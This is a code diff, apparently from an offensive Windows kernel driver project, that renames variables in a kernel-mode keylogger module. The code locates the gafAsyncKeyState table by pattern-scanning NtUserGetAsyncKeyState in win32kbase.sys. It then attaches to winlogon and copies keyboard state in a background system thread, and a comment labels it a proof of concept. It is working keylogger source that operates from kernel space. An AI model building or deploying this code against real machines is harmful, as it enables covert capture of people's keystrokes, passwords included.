@@ -26,9 +26,9 @@
 
 #include "VK.hpp"
 
-UINT8 KeyStateMap[64]         = { 0 };
-UINT8 KeyPreviousStateMap[64] = { 0 };
-UINT8 KeyRecentStateMap[64]   = { 0 };
+UINT8 keyStateMap[64]         = { 0 };
+UINT8 keyPreviousStateMap[64] = { 0 };
+UINT8 keyRecentStateMap[64]   = { 0 };
 
 /*
  * @brief Converts a virtual key code (VK) to its corresponding string representation.
@@ -361,30 +361,30 @@ BeVkToChar(_In_ UINT8 vk)
  */
 VOID
 BeUpdateKeyStateMap(
-    _In_ CONST HANDLE& ProcId, 
-    _In_ CONST PVOID&  GafAsyncKeyStateAddr
+    _In_ CONST HANDLE& procId, 
+    _In_ CONST PVOID&  gafAsyncKeyStateAddr
 ) {
-    memcpy(KeyPreviousStateMap, KeyStateMap, 64);
+    memcpy(keyPreviousStateMap, keyStateMap, 64);
 
     SIZE_T Size = 0;
     BeGlobals::pMmCopyVirtualMemory(
-        BeGetEprocessByPid(HandleToULong(ProcId)),
-        GafAsyncKeyStateAddr,
+        BeGetEprocessByPid(HandleToULong(procId)),
+        gafAsyncKeyStateAddr,
         PsGetCurrentProcess(), 
-        &KeyStateMap,
+        &keyStateMap,
         sizeof(UINT8[64]),
         KernelMode,
         &Size
     );
 
-    for (auto Vk = 0u; Vk < 256; ++Vk) 
+    for (auto vk = 0u; vk < 256; ++vk) 
     {
         //
         // If key is down but wasnt previously, set it in the recent state as down
         //
-        if (IS_KEY_DOWN(KeyStateMap, Vk) && !(IS_KEY_DOWN(KeyPreviousStateMap, Vk)))
+        if (IS_KEY_DOWN(keyStateMap, vk) && !(IS_KEY_DOWN(keyPreviousStateMap, vk)))
         {
-            SET_KEY_DOWN(KeyRecentStateMap, Vk, TRUE);
+            SET_KEY_DOWN(keyRecentStateMap, vk, TRUE);
         }
     }
 }
@@ -397,10 +397,12 @@ BeUpdateKeyStateMap(
  * @return BOOLEAN TRUE if the key was pressed, FALSE otherwise.
  */
 BOOLEAN
-BeWasKeyPressed(_In_ UINT8 Vk)
+BeWasKeyPressed(
+    _In_ UINT8 vk
+)
 {
-    BOOLEAN result = IS_KEY_DOWN(KeyRecentStateMap, Vk);
-    SET_KEY_DOWN(KeyRecentStateMap, Vk, FALSE);
+    BOOLEAN result = IS_KEY_DOWN(keyRecentStateMap, vk);
+    SET_KEY_DOWN(keyRecentStateMap, vk, FALSE);
     return result;
 }
 
@@ -416,79 +418,79 @@ BeGetGafAsyncKeyStateAddress()
     // TODO FIXME: THIS IS WINDOWS <= 10 ONLY
     //
 
-    KAPC_STATE Apc = { 0 };
+    KAPC_STATE apc = { 0 };
 
     //
     // Get Address of NtUserGetAsyncKeyState
     //
-    DWORD64 NtUserGetAsyncKeyState = (DWORD64)BeGetSystemRoutineAddress("win32kbase.sys", "NtUserGetAsyncKeyState");
-    LOG_MSG("NtUserGetAsyncKeyState: 0x%llx\n", NtUserGetAsyncKeyState);
+    DWORD64 ntUserGetAsyncKeyState = (DWORD64)BeGetSystemRoutineAddress("win32kbase.sys", "NtUserGetAsyncKeyState");
+    LOG_MSG("NtUserGetAsyncKeyState: 0x%llx\n", ntUserGetAsyncKeyState);
     
     //
     // To read session driver modules (such as win32kbase.sys, which contains NtUserGetAsyncKeyState), we need a process running in a user session 
     // https://www.unknowncheats.me/forum/general-programming-and-reversing/492970-reading-memory-win32kbase-sys.html
     //
-    KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
+    KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
 
-    PVOID Address = 0;
-    INT   I       = 0;
+    PVOID address = 0;
+    UINT16 i      = 0;
 
     //
     // Resolve gafAsyncKeyState address
     //
-    for (; I < 500; ++I)
+    for (; i < 500; ++i)
     {
         if (
-            *(BYTE*)(NtUserGetAsyncKeyState + I) == MOV_RAX_QWORD_BYTE1
-            && *(BYTE*)(NtUserGetAsyncKeyState + I + 1) == MOV_RAX_QWORD_BYTE2
-            && *(BYTE*)(NtUserGetAsyncKeyState + I + 2) == MOV_RAX_QWORD_BYTE3
+            *(BYTE*)(ntUserGetAsyncKeyState + i) == MOV_RAX_QWORD_BYTE1
+            && *(BYTE*)(ntUserGetAsyncKeyState + i + 1) == MOV_RAX_QWORD_BYTE2
+            && *(BYTE*)(ntUserGetAsyncKeyState + i + 2) == MOV_RAX_QWORD_BYTE3
         )
         {
             //
             // param for MOV RAX QWORD PTR is the offset to the address of 
             //
-            UINT32 Offset = (*(PUINT32)(NtUserGetAsyncKeyState + I + 3));
+            UINT32 offset = (*(PUINT32)(ntUserGetAsyncKeyState + i + 3));
             
             //
             // 4 = length of offset value
             //
-            Address = (PVOID)(NtUserGetAsyncKeyState + I + 3 + 4 + Offset);
+            address = (PVOID)(ntUserGetAsyncKeyState + i + 3 + 4 + offset);
     
-            LOG_MSG("%02X %02X %02X %lx\n", *(BYTE*)(NtUserGetAsyncKeyState + I), *(BYTE*)(NtUserGetAsyncKeyState + I + 1), *(BYTE*)(NtUserGetAsyncKeyState + I + 2), Offset);
+            LOG_MSG("%02X %02X %02X %lx\n", *(BYTE*)(ntUserGetAsyncKeyState + i), *(BYTE*)(ntUserGetAsyncKeyState + i + 1), *(BYTE*)(ntUserGetAsyncKeyState + i + 2), offset);
             break;
         }
     }
 
-    if (Address == 0)
+    if (address == 0)
     {
         LOG_MSG("Could not resolve gafAsyncKeyState...\n");
     }
     else
     {
-        LOG_MSG("Found address to gafAsyncKeyState at offset [NtUserGetAsyncKeyState]+%i: 0x%llx\n", (INT)I, (ULONG_PTR)Address);
+        LOG_MSG("Found address to gafAsyncKeyState at offset [NtUserGetAsyncKeyState]+%i: 0x%llx\n", (INT)i, (ULONG_PTR)address);
     }
 
-    KeUnstackDetachProcess(&Apc);
-    return Address;
+    KeUnstackDetachProcess(&apc);
+    return address;
 }
 
 /*
  * @brief Background keylogger thread function that reads directly from gafAsyncKeyStateAddress.
- *
- * @param[in] StartContext Context parameter (unused).
  */
 VOID
-BeKeyLoggerFunction(_In_ PVOID StartContext)
+BeKeyLoggerFunction(
+    _In_ PVOID startContext
+)
 {
-    UNREFERENCED_PARAMETER(StartContext);
+    UNREFERENCED_PARAMETER(startContext);
 
-    PVOID GasAsyncKeyStateAddr = BeGetGafAsyncKeyStateAddress();
+    PVOID gafAsyncKeyStateAddr = BeGetGafAsyncKeyStateAddress();
 
     while(true)
     {
-        if (BeGlobals::LogKeys)
+        if (BeGlobals::bLogKeys)
         {
-            BeUpdateKeyStateMap(BeGlobals::WinLogonPid, GasAsyncKeyStateAddr);
+            BeUpdateKeyStateMap(BeGlobals::winLogonPid, gafAsyncKeyStateAddr);
 
             //
             // Just a poc :)
@@ -500,7 +502,7 @@ BeKeyLoggerFunction(_In_ PVOID StartContext)
         }
     }
         
-    if (BeGlobals::Shutdown)
+    if (BeGlobals::bShutdown)
     {
         KeSetEvent(&BeGlobals::hKeyLoggerTerminationEvent, IO_NO_INCREMENT, FALSE);
         PsTerminateSystemThread(STATUS_SUCCESS);
@@ -509,7 +511,7 @@ BeKeyLoggerFunction(_In_ PVOID StartContext)
     //
     // Sleep for 0.05 seconds
     //
-    LARGE_INTEGER Interval;
-    Interval.QuadPart = -1 * (LONGLONG)50 * 10000;
-    KeDelayExecutionThread(KernelMode, FALSE, &Interval);
+    LARGE_INTEGER interval;
+    interval.QuadPart = -1 * (LONGLONG)50 * 10000;
+    KeDelayExecutionThread(KernelMode, FALSE, &interval);
 }
